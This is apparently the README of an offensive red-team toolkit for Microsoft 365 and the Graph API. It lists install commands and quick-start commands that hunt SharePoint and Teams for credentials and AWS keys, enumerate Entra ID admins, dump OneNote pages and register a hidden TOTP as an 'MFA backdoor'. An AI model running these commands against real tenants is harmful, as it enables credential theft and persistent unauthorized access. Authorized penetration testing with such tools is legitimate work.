# 🔭 msgraphX

Microsoft Graph eXploitation toolkit. ~~Ab~~using the [Microsoft Graph API](https://learn.microsoft.com/en-us/graph/overview) [SDK](https://github.com/microsoftgraph/msgraph-sdk-python) to search and harvest SharePoint files, Outlook mail, Teams messages and Microsoft 365 data during red team operations and penetration tests.

- **SharePoint**: search across all sites, filter by filetype, use predefined hunt queries, bulk download
- **Outlook**: build communication graphs from mailboxes, KQL keyword search, download emails as `.eml`
- **Teams**: search DMs and channel messages, browse chats, inspect message context
- **Entra ID**: enumerate users, groups, devices, apps, roles, PIM assignments, OAuth2 grants, conditional access policies, MFA methods
- **Me**: calendar, OneNote, Planner tasks, people graph, trending/shared/used documents
- **MFA backdoor**: register TOTP, phone, or email as secondary factor via `mysignins.microsoft.com`
- **Output**: local caching of search results, JSON/NDJSON export, resumable downloads

For the full command reference see [USAGE.md](USAGE.md).

## 📦 Installation

```bash
uv tool install git+https://github.com/n3rada/msgraphx.git
```

Run without installing:

```bash
uvx --from git+https://github.com/n3rada/msgraphx.git msgraphx --help
```

With pipx or pip:

```bash
pipx install 'git+https://github.com/n3rada/msgraphx.git'
pip install 'git+https://github.com/n3rada/msgraphx.git'
```

## 🔑 Authentication

### Delegated (user context)

Use [msauth-browser](https://github.com/n3rada/msauth-browser) to authenticate through a real browser and save tokens:

```bash
msauth-browser --save roadtools
msgraphx outlook contacts   # picks up .roadtools_auth automatically
```

Or pass the token directly:

```bash
msgraphx --access-token <JWT> sp search "password"
export ACCESS_TOKEN=<JWT>
msgraphx sp search "password"
```

### Application (app-only)

```bash
msgraphx --tenant-id <tid> --client-id <cid> --client-secret <secret> sp search "password"
```

Or via environment variables `TENANT_ID`, `CLIENT_ID`, `CLIENT_SECRET`.

> [!NOTE]
> App-only tokens cannot use the `/me` endpoint. Modules that require a user context (Outlook, me) only work with delegated auth.

## ⚔️ Quick start

```bash
# SharePoint: hunt for credentials across all sites
msgraphx sp search --hunt credentials

# Outlook: build a communication graph
msgraphx outlook contacts

# Teams: search DMs for AWS keys
msgraphx teams chat "aws key" --after 90d

# Entra ID: enumerate admin accounts
msgraphx aad search --hunt admins

# Entra ID: list PIM assignments
msgraphx aad pim

# Me: dump OneNote pages
msgraphx me onenote --list

# MFA backdoor: register a hidden TOTP
msgraphx mfa --mfa-token <mysignins-token> add-otp

# Raw Graph query
msgraphx /users
msgraphx query /me/messages --filter "hasAttachments eq true" --paginate
```

See [USAGE.md](USAGE.md) for all flags, subcommands, and options for each module.

## 🔬 Graph Explorer

[Graph Explorer](https://developer.microsoft.com/en-us/graph/graph-explorer) lets you run live queries against the Graph API and generate ready-to-paste Python SDK code snippets via the *Code snippets* tab. Use it to prototype any query before implementing a module.
